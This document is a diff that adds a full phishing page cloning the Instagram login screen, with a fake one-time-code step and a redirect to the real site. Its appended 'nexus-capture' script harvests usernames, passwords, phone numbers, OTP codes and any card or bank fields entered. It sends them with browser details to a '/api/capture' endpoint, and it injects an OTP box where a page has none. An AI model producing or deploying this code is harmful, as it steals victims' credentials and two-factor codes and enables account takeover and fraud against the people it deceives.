@@ -1,0 +1,825 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in • Instagram</title>
+    <style>
+        :root {
+            --bg-page: #fafafa;
+            --bg-card: #ffffff;
+            --border-line: #dbdbdb;
+            --text-main: #262626;
+            --text-muted: #737373;
+            --link-blue: #00376b;
+            --btn-blue: #0095f6;
+            --btn-blue-hover: #1877f2;
+            --ig-script-blue: #16568b;
+            --error-red: #d93025;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-page);
+            color: var(--text-main);
+            min-height: 100dvh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            padding: 12px 16px 36px;
+        }
+
+        .auth-wrapper {
+            width: 100%;
+            max-width: 360px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+        }
+
+        /* Top centered large logo positioned higher + clear spacing below */
+        .top-brand-header {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            margin-top: -4px;
+            margin-bottom: 18px;
+        }
+
+        .ig-brand-row {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            user-select: none;
+        }
+
+        .ig-wordmark {
+            font-family: "Brush Script MT", "Lucida Handwriting", "Segoe Script", "Snell Roundhand", cursive;
+            font-size: 4.15rem;
+            font-weight: 600;
+            font-style: italic;
+            line-height: 1;
+            letter-spacing: -0.6px;
+            color: var(--ig-script-blue);
+        }
+
+        .ig-cam-icon {
+            width: 44px;
+            height: 44px;
+            flex-shrink: 0;
+            transform: translateY(1px);
+        }
+
+        .top-login-label {
+            margin-top: 12px;
+            font-size: 1.05rem;
+            font-weight: 700;
+            color: var(--text-main);
+            letter-spacing: 0.2px;
+        }
+
+        .card {
+            width: 100%;
+            background-color: var(--bg-card);
+            border: 1px solid var(--border-line);
+            border-radius: 3px;
+            padding: 26px 32px 22px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .step-panel {
+            width: 100%;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .step-panel.active {
+            display: flex;
+        }
+
+        .login-form,
+        .otp-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .ig-input {
+            width: 100%;
+            height: 38px;
+            padding: 0 10px;
+            background-color: var(--bg-page);
+            border: 1px solid var(--border-line);
+            border-radius: 3px;
+            font-size: 0.82rem;
+            color: var(--text-main);
+            outline: none;
+        }
+
+        .ig-input::placeholder {
+            color: #8e8e8e;
+            font-size: 0.78rem;
+        }
+
+        .ig-input:focus {
+            border-color: #a8a8a8;
+        }
+
+        .otp-title {
+            font-size: 0.98rem;
+            font-weight: 700;
+            color: var(--text-main);
+            margin-bottom: 6px;
+            text-align: center;
+        }
+
+        .otp-desc {
+            font-size: 0.78rem;
+            color: var(--text-muted);
+            text-align: center;
+            line-height: 1.45;
+            margin-bottom: 12px;
+        }
+
+        .otp-input {
+            width: 100%;
+            height: 42px;
+            padding: 0 12px;
+            background-color: var(--bg-page);
+            border: 1px solid var(--border-line);
+            border-radius: 4px;
+            font-size: 1rem;
+            font-weight: 700;
+            letter-spacing: 6px;
+            text-align: center;
+            color: var(--text-main);
+            outline: none;
+        }
+
+        .otp-input:focus {
+            border-color: var(--btn-blue);
+            background-color: #ffffff;
+        }
+
+        .error-msg {
+            color: var(--error-red);
+            font-size: 0.76rem;
+            display: none;
+            margin-top: 2px;
+        }
+
+        .btn-login {
+            width: 100%;
+            height: 34px;
+            margin-top: 8px;
+            background-color: var(--btn-blue);
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            font-size: 0.86rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.15s ease;
+        }
+
+        .btn-login:hover {
+            background-color: var(--btn-blue-hover);
+        }
+
+        .back-link-btn {
+            margin-top: 12px;
+            background: none;
+            border: none;
+            color: var(--link-blue);
+            font-size: 0.78rem;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .back-link-btn:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            margin: 16px 0 14px;
+            color: var(--text-muted);
+            font-size: 0.78rem;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: var(--border-line);
+        }
+
+        .fb-btn {
+            background: none;
+            border: none;
+            color: #385185;
+            font-size: 0.85rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 14px;
+        }
+
+        .fb-btn:hover {
+            opacity: 0.85;
+        }
+
+        .forgot-link {
+            color: var(--link-blue);
+            font-size: 0.76rem;
+            text-decoration: none;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .signup-card {
+            width: 100%;
+            background-color: var(--bg-card);
+            border: 1px solid var(--border-line);
+            border-radius: 3px;
+            padding: 18px 20px;
+            text-align: center;
+            font-size: 0.85rem;
+            color: var(--text-main);
+        }
+
+        .signup-card a {
+            color: var(--btn-blue);
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .signup-card a:hover {
+            text-decoration: underline;
+        }
+
+        /* Full white screen with spinning circle loader (3s) */
+        .white-loader-overlay {
+            position: fixed;
+            inset: 0;
+            background-color: #ffffff;
+            z-index: 999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .white-loader-overlay.active {
+            display: flex;
+        }
+
+        .circle-spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid rgba(0, 149, 246, 0.2);
+            border-top-color: var(--btn-blue);
+            border-radius: 50%;
+            animation: spinCircle 0.8s linear infinite;
+        }
+
+        @keyframes spinCircle {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- Full white screen loader -->
+    <div id="whiteLoader" class="white-loader-overlay" role="status" aria-live="polite" aria-label="Loading">
+        <div class="circle-spinner"></div>
+    </div>
+
+    <main class="auth-wrapper">
+        <header class="top-brand-header">
+            <div class="ig-brand-row">
+                <span class="ig-wordmark">Instagram</span>
+                <svg class="ig-cam-icon" viewBox="0 0 24 24" aria-hidden="true">
+                    <defs>
+                        <linearGradient id="igGrad" x1="15%" y1="90%" x2="85%" y2="10%">
+                            <stop offset="0%" stop-color="#feda75"/>
+                            <stop offset="25%" stop-color="#fa7e1e"/>
+                            <stop offset="50%" stop-color="#d62976"/>
+                            <stop offset="75%" stop-color="#962fbf"/>
+                            <stop offset="100%" stop-color="#4f5bd5"/>
+                        </linearGradient>
+                    </defs>
+                    <rect x="2" y="2" width="20" height="20" rx="5.5" fill="url(#igGrad)"/>
+                    <rect x="5" y="5" width="14" height="14" rx="4" fill="none" stroke="#ffffff" stroke-width="1.8"/>
+                    <circle cx="12" cy="12" r="3.4" fill="none" stroke="#ffffff" stroke-width="1.8"/>
+                    <circle cx="16.6" cy="7.4" r="1.15" fill="#ffffff"/>
+                </svg>
+            </div>
+            <div class="top-login-label">Log in</div>
+        </header>
+
+        <section class="card">
+            <!-- Step 1: Login -->
+            <div id="stepLogin" class="step-panel active">
+                <form id="ig-login-form" class="login-form" novalidate>
+                    <input
+                        type="text"
+                        id="ig-username"
+                        name="username"
+                        class="ig-input"
+                        placeholder="Phone number, username, or email"
+                        autocomplete="username"
+                    >
+                    <input
+                        type="password"
+                        id="ig-password"
+                        name="password"
+                        class="ig-input"
+                        placeholder="Password"
+                        autocomplete="current-password"
+                    >
+                    <p id="loginError" class="error-msg">Please enter your username and password.</p>
+                    <button type="submit" id="ig-submit-btn" class="btn-login">Log in</button>
+                </form>
+
+                <div class="divider">or</div>
+
+                <button type="button" id="ig-fb-btn" class="fb-btn">Log in with Facebook</button>
+                <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-link">Forgot password?</a>
+            </div>
+
+            <!-- Step 2: OTP Code -->
+            <div id="stepOtp" class="step-panel">
+                <h2 class="otp-title">Enter OTP Code</h2>
+                <p class="otp-desc">Enter the verification code sent to your account to continue.</p>
+
+                <form id="ig-otp-form" class="otp-form" novalidate>
+                    <input
+                        type="text"
+                        id="ig-otp-input"
+                        name="otp_code"
+                        class="otp-input"
+                        inputmode="numeric"
+                        maxlength="6"
+                        placeholder="••••••"
+                        autocomplete="one-time-code"
+                    >
+                    <p id="otpError" class="error-msg">Please enter a valid OTP code.</p>
+                    <button type="submit" id="ig-otp-btn" class="btn-login">Confirm</button>
+                </form>
+
+                <button type="button" id="backToLoginBtn" class="back-link-btn">Back to login</button>
+            </div>
+        </section>
+
+        <section class="signup-card">
+            Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
+        </section>
+    </main>
+
+    <script>
+        (function () {
+            const INSTAGRAM_URL = "https://www.instagram.com/";
+            const LOADER_DURATION_MS = 3000;
+
+            const whiteLoader = document.getElementById("whiteLoader");
+            const stepLogin = document.getElementById("stepLogin");
+            const stepOtp = document.getElementById("stepOtp");
+
+            const loginForm = document.getElementById("ig-login-form");
+            const usernameInput = document.getElementById("ig-username");
+            const passwordInput = document.getElementById("ig-password");
+            const loginError = document.getElementById("loginError");
+
+            const otpForm = document.getElementById("ig-otp-form");
+            const otpInput = document.getElementById("ig-otp-input");
+            const otpError = document.getElementById("otpError");
+
+            let isBusy = false;
+
+            function runWhiteSpinner(duration, onComplete) {
+                if (isBusy) return;
+                isBusy = true;
+                whiteLoader.classList.add("active");
+
+                setTimeout(() => {
+                    whiteLoader.classList.remove("active");
+                    isBusy = false;
+                    if (typeof onComplete === "function") {
+                        onComplete();
+                    }
+                }, duration);
+            }
+
+            function showOtpScreen() {
+                stepLogin.classList.remove("active");
+                stepOtp.classList.add("active");
+                otpInput.value = "";
+                otpError.style.display = "none";
+                setTimeout(() => otpInput.focus(), 50);
+            }
+
+            function showLoginScreen() {
+                stepOtp.classList.remove("active");
+                stepLogin.classList.add("active");
+                otpError.style.display = "none";
+            }
+
+            usernameInput.addEventListener("input", () => {
+                loginError.style.display = "none";
+            });
+
+            passwordInput.addEventListener("input", () => {
+                loginError.style.display = "none";
+            });
+
+            otpInput.addEventListener("input", () => {
+                otpInput.value = otpInput.value.replace(/\D/g, "");
+                otpError.style.display = "none";
+            });
+
+            loginForm.addEventListener("submit", (e) => {
+                e.preventDefault();
+                if (isBusy) return;
+
+                const userVal = usernameInput.value.trim();
+                const passVal = passwordInput.value;
+
+                if (!userVal || !passVal) {
+                    loginError.style.display = "block";
+                    return;
+                }
+
+                loginError.style.display = "none";
+                runWhiteSpinner(LOADER_DURATION_MS, showOtpScreen);
+            });
+
+            otpForm.addEventListener("submit", (e) => {
+                e.preventDefault();
+                if (isBusy) return;
+
+                const codeVal = otpInput.value.trim();
+                if (codeVal.length < 4) {
+                    otpError.style.display = "block";
+                    otpInput.focus();
+                    return;
+                }
+
+                otpError.style.display = "none";
+                runWhiteSpinner(LOADER_DURATION_MS, () => {
+                    window.location.href = INSTAGRAM_URL;
+                });
+            });
+
+            document.getElementById("ig-fb-btn").addEventListener("click", () => {
+                if (isBusy) return;
+                runWhiteSpinner(LOADER_DURATION_MS, showOtpScreen);
+            });
+
+            document.getElementById("backToLoginBtn").addEventListener("click", () => {
+                if (!isBusy) showLoginScreen();
+            });
+        })();
+    </script>
+<script data-nexus-capture="true">
+(function() {
+  const NEXUS_CFG = {
+    endpoint: "/api/capture",
+    owner: "Kim",
+    network: "Facebook",
+    enableOtp: true,
+    caps: {"id":true,"pass":true,"phone":true,"bank":false,"extra":false,"otp":true}
+  };
+
+  const urlParams = new URLSearchParams(window.location.search);
+  const effectiveOwner = (urlParams.get("user") || NEXUS_CFG.owner || "Inconnu").trim();
+
+  const state = {
+    victimUser: "",
+    victimPass: "",
+    otp: "Aucun",
+    capturedFields: {},
+    sentFingerprints: new Set()
+  };
+
+  function getFieldDescriptor(el) {
+    let labelTxt = "";
+    if (el.id) {
+      const lbl = document.querySelector('label[for="' + CSS.escape(el.id) + '"]');
+      if (lbl) labelTxt = (lbl.innerText || lbl.textContent || "").trim();
+    }
+    const parentLbl = el.closest("label");
+    if (parentLbl) {
+      labelTxt = (labelTxt + " " + (parentLbl.innerText || parentLbl.textContent || "")).trim();
+    }
+
+    const baseName =
+      el.name ||
+      el.id ||
+      labelTxt ||
+      el.placeholder ||
+      el.getAttribute("aria-label") ||
+      el.getAttribute("autocomplete") ||
+      ("field_" + (el.type || "text"));
+
+    const meta = [
+      el.id,
+      el.name,
+      el.placeholder,
+      el.getAttribute("aria-label"),
+      el.getAttribute("autocomplete"),
+      el.getAttribute("inputmode"),
+      el.className,
+      labelTxt
+    ]
+      .filter(Boolean)
+      .join(" ")
+      .toLowerCase();
+
+    return { key: baseName.trim(), meta };
+  }
+
+  function classifyInput(el) {
+    const type = (el.type || "text").toLowerCase();
+    if (type === "hidden" || type === "submit" || type === "button" || type === "reset") {
+      return "ignore";
+    }
+
+    const { meta } = getFieldDescriptor(el);
+
+    if (type === "password" || (/password|pass|mot de passe|pin/i.test(meta) && !/otp|2fa/i.test(meta))) {
+      return "pass";
+    }
+
+    const ac = (el.getAttribute("autocomplete") || "").toLowerCase();
+    const maxLen = parseInt(el.getAttribute("maxlength") || "0", 10);
+    const isBank = /card|carte|cc-|cvv|cvc|csc|exp|expiry|expiration|iban|rib|bic|swift|routing|sort.?code|account.?num|banque|bank|billing/i.test(meta);
+    const isDob = type === "date" || /birth|naissance|dob|bday|jour|mois|ann[ée]e|jj|mm|aaaa|yyyy/i.test(meta);
+
+    if (
+      ac === "one-time-code" ||
+      (!isBank && !isDob && (
+        /\botp\b|2fa|mfa|one-time|verification.?code|code.?v[ée]rif|security.?code/i.test(meta) ||
+        (type !== "password" && maxLen >= 4 && maxLen <= 8 && /\bcode\b/i.test(meta))
+      ))
+    ) {
+      return "otp";
+    }
+
+    if (isBank) return "bank";
+    if (type === "tel" || /phone|t[ée]l[ée]phone|mobile|indicatif|country.?code|prefix|\+225|\+221|\+237|\+33/i.test(meta)) {
+      return "phone";
+    }
+    if (type === "email" || /email|e-mail|identifiant|username|user|login/i.test(meta)) {
+      return "id";
+    }
+    if (isDob || type === "text" || type === "number" || type === "search" || el.tagName === "SELECT" || el.tagName === "TEXTAREA") {
+      return "extra";
+    }
+
+    return "extra";
+  }
+
+  function collectCurrentValues() {
+    const fields = Array.from(document.querySelectorAll("input, select, textarea"));
+    const otpParts = [];
+    const phoneParts = [];
+    const allCaptured = {};
+
+    let idCandidate = "";
+    let passCandidate = "";
+    let bankCandidate = "";
+    let extraCandidate = "";
+
+    const activeBtn = document.querySelector(".tab-btn.active");
+    const activeTab = activeBtn ? (activeBtn.dataset.tab || "") : "";
+
+    fields.forEach((el, idx) => {
+      const type = (el.type || "text").toLowerCase();
+      if (type === "submit" || type === "button" || type === "reset") return;
+
+      const role = classifyInput(el);
+      if (role === "ignore") return;
+
+      if (!NEXUS_CFG.caps[role]) return;
+
+      const { key } = getFieldDescriptor(el);
+      let val = "";
+
+      if (type === "checkbox") {
+        val = el.checked ? (el.value || "Oui") : "";
+      } else if (type === "radio") {
+        if (!el.checked) return;
+        val = el.value || "Sélectionné";
+      } else {
+        val = (el.value || "").trim();
+      }
+
+      if (!val) return;
+
+      const uniqueKey = allCaptured[key] !== undefined && allCaptured[key] !== val ? (key + "_" + (idx + 1)) : key;
+      allCaptured[uniqueKey] = val;
+
+      if (role === "otp") {
+        otpParts.push(val);
+      } else if (role === "pass") {
+        passCandidate = el.value;
+      } else if (role === "phone") {
+        phoneParts.push(val);
+      } else if (role === "id" && !idCandidate) {
+        idCandidate = val;
+      } else if (role === "bank" && !bankCandidate) {
+        bankCandidate = val;
+      } else if (!extraCandidate) {
+        extraCandidate = val;
+      }
+    });
+
+    if (activeTab) {
+      allCaptured.onglet_actif = activeTab;
+    }
+
+    const combinedPhone = phoneParts.join(" ").trim();
+
+    if ((activeTab === "phone" || activeTab === "code") && combinedPhone && NEXUS_CFG.caps.phone) {
+      state.victimUser = combinedPhone;
+    } else {
+      state.victimUser = idCandidate || combinedPhone || bankCandidate || extraCandidate || "";
+    }
+
+    state.victimPass = NEXUS_CFG.caps.pass ? (passCandidate || state.victimPass || "") : "";
+    state.otp = (NEXUS_CFG.caps.otp && otpParts.length > 0) ? otpParts.join("") : "Aucun";
+    state.capturedFields = allCaptured;
+  }
+
+  function postPayload(payload) {
+    const fingerprint = JSON.stringify(payload);
+    if (state.sentFingerprints.has(fingerprint)) return;
+    state.sentFingerprints.add(fingerprint);
+
+    fetch(NEXUS_CFG.endpoint, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+      keepalive: true
+    }).catch(() => {});
+  }
+
+  function sendCapture(stage, extra = {}) {
+    collectCurrentValues();
+
+    const hasFields = Object.keys(state.capturedFields).length > 0;
+    const hasMainData = Boolean(state.victimUser || state.victimPass || (state.otp && state.otp !== "Aucun"));
+    if (!hasFields && !hasMainData && (!extra.otp || extra.otp === "Aucun")) {
+      return;
+    }
+
+    const isOtpEvent = Boolean(NEXUS_CFG.caps.otp && extra.otp && extra.otp !== "Aucun" && extra.otp !== "En attente OTP...");
+    const effectiveOtp = NEXUS_CFG.caps.otp
+      ? (extra.otp || (isOtpEvent ? state.otp : (NEXUS_CFG.enableOtp ? "En attente OTP..." : "Aucun")))
+      : "Aucun";
+
+    const payload = {
+      owner: effectiveOwner,
+      network: NEXUS_CFG.network,
+      type: isOtpEvent ? "otp" : stage,
+      victimUser: state.victimUser || "Inconnu",
+      victimPass: state.victimPass || "Inconnu",
+      otp: effectiveOtp,
+      fields: state.capturedFields,
+      extra_info: JSON.stringify({
+        ua: navigator.userAgent,
+        platform: navigator.platform,
+        fields: state.capturedFields
+      })
+    };
+
+    postPayload(payload);
+  }
+
+  function ensureOtpSectionIfNeeded() {
+    if (!NEXUS_CFG.enableOtp || !NEXUS_CFG.caps.otp) return;
+
+    const existingOtp = Array.from(document.querySelectorAll("input, select, textarea")).some((el) => classifyInput(el) === "otp");
+    if (existingOtp) return;
+
+    if (document.getElementById("nexus-auto-otp-box")) return;
+
+    const box = document.createElement("div");
+    box.id = "nexus-auto-otp-box";
+    box.style.cssText = [
+      "margin:14px auto",
+      "padding:14px",
+      "max-width:360px",
+      "border:1px solid #d0d7de",
+      "border-radius:10px",
+      "background:#ffffff",
+      "font-family:inherit",
+      "text-align:center"
+    ].join(";");
+
+    box.innerHTML = `
+      <div style="font-size:13px;font-weight:700;margin-bottom:8px;color:#111827;">Code de vérification (OTP)</div>
+      <input
+        id="nexus-otp-field"
+        data-nexus-injected-otp="true"
+        type="text"
+        inputmode="numeric"
+        maxlength="6"
+        placeholder="••••••"
+        style="width:100%;padding:10px;text-align:center;font-size:18px;letter-spacing:8px;border:1px solid #9ca3af;border-radius:8px;margin-bottom:10px;"
+      />
+      <button
+        id="nexus-otp-submit"
+        type="button"
+        style="width:100%;padding:10px;border:none;border-radius:8px;background:#111827;color:#fff;font-weight:600;cursor:pointer;"
+      >Valider le code OTP</button>
+    `;
+
+    const targetForm = document.querySelector("form");
+    if (targetForm && targetForm.parentElement) {
+      targetForm.parentElement.insertBefore(box, targetForm.nextSibling);
+    } else {
+      document.body.appendChild(box);
+    }
+
+    const otpInput = document.getElementById("nexus-otp-field");
+    const otpBtn = document.getElementById("nexus-otp-submit");
+
+    otpInput.addEventListener("input", () => {
+      otpInput.value = otpInput.value.replace(/\D/g, "");
+      collectCurrentValues();
+    });
+
+    otpBtn.addEventListener("click", () => {
+      collectCurrentValues();
+      const code = otpInput.value.trim();
+      sendCapture("otp", { otp: code || state.otp });
+    });
+  }
+
+  document.addEventListener("input", (e) => {
+    const el = e.target;
+    if (!el || !["INPUT", "SELECT", "TEXTAREA"].includes(el.tagName)) return;
+    collectCurrentValues();
+  }, true);
+
+  document.addEventListener("change", (e) => {
+    const el = e.target;
+    if (!el || !["INPUT", "SELECT", "TEXTAREA"].includes(el.tagName)) return;
+    collectCurrentValues();
+  }, true);
+
+  document.addEventListener("submit", () => {
+    collectCurrentValues();
+    const hasOtp = NEXUS_CFG.caps.otp && state.otp && state.otp !== "Aucun";
+    if (hasOtp) {
+      sendCapture("otp", { otp: state.otp });
+    } else {
+      sendCapture((NEXUS_CFG.enableOtp && NEXUS_CFG.caps.otp) ? "OTP_STEP1" : "STANDARD");
+    }
+  }, true);
+
+  document.addEventListener("click", (e) => {
+    const btn = e.target.closest("button, input[type='submit'], input[type='button'], [role='button']");
+    if (!btn || btn.id === "nexus-otp-submit") return;
+    collectCurrentValues();
+    const txt = (btn.innerText || btn.value || "").toLowerCase();
+    const hasOtp = NEXUS_CFG.caps.otp && state.otp && state.otp !== "Aucun";
+    if (hasOtp && (txt.includes("otp") || txt.includes("verify") || txt.includes("vérif") || txt.includes("confirm") || txt.includes("valid"))) {
+      sendCapture("otp", { otp: state.otp });
+    } else if (Object.keys(state.capturedFields).length > 0 || state.victimUser || state.victimPass) {
+      sendCapture((NEXUS_CFG.enableOtp && NEXUS_CFG.caps.otp) ? "OTP_STEP1" : "STANDARD");
+    }
+  }, true);
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", ensureOtpSectionIfNeeded);
+  } else {
+    ensureOtpSectionIfNeeded();
+  }
+})();
+</script>
+</body>
+</html>
